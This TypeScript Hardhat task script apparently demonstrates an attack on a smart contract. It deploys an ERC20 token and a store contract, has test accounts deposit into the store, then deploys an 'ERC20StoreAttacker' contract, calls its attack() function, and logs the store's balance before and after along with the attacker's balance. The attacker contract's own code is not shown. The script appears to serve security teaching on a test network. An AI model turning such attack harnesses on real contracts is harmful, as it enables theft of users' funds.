import { task } from "hardhat/config";
import { formatEther, WeiPerEther } from "ethers";

task("erc20", "Deploys EtherStore contract").setAction(async (_, hre) => {
  const tokenFactory = await hre.ethers.getContractFactory("ERC20Token");
  const tokenInstance = await tokenFactory.deploy("EthBerryToken", "EBT");

  console.info(`Erc20 Token deployed to ${tokenInstance.target}`);

  const storeFactory = await hre.ethers.getContractFactory("ERC20Store");
  const storeInstance = await storeFactory.deploy(tokenInstance.target);
  await storeInstance.waitForDeployment();

  console.info(`Erc20 Store deployed to ${storeInstance.target}`);

  const accounts = await hre.ethers.getSigners();

  for (const account of accounts) {
    const tx = await tokenInstance.mint(account, 10n * WeiPerEther);
    await tx.wait();
  }

  for (const account of accounts) {
    const tx = await tokenInstance.connect(account).approve(storeInstance.target, 10n * WeiPerEther);
    await tx.wait();
  }

  for (const account of accounts) {
    const tx = await storeInstance.connect(account).deposit(WeiPerEther);
    await tx.wait();
  }

  const balance1 = await tokenInstance.balanceOf(storeInstance.target);
  console.info(`Store Balance: ${formatEther(balance1)} ETH`);

  const attackerFactory = await hre.ethers.getContractFactory("ERC20StoreAttacker");
  const attackerInstance = await attackerFactory.deploy(tokenInstance.target, storeInstance.target);
  await attackerInstance.waitForDeployment();

  console.info(`Attacker deployed to ${attackerInstance.target}`);

  const tx1 = await tokenInstance.mint(attackerInstance.target, 10n * WeiPerEther);
  await tx1.wait();

  const tx2 = await attackerInstance.attack();
  await tx2.wait();

  const balance2 =  await tokenInstance.balanceOf(storeInstance.target);
  console.info(`Store Balance: ${formatEther(balance2)} ETH`);

  const balance3 =  await tokenInstance.balanceOf(attackerInstance.target);
  console.info(`Atacker Balance: ${formatEther(balance3)} ETH`);

  console.info("DONE");
});

// hardhat erc20 --network ethberry_besu
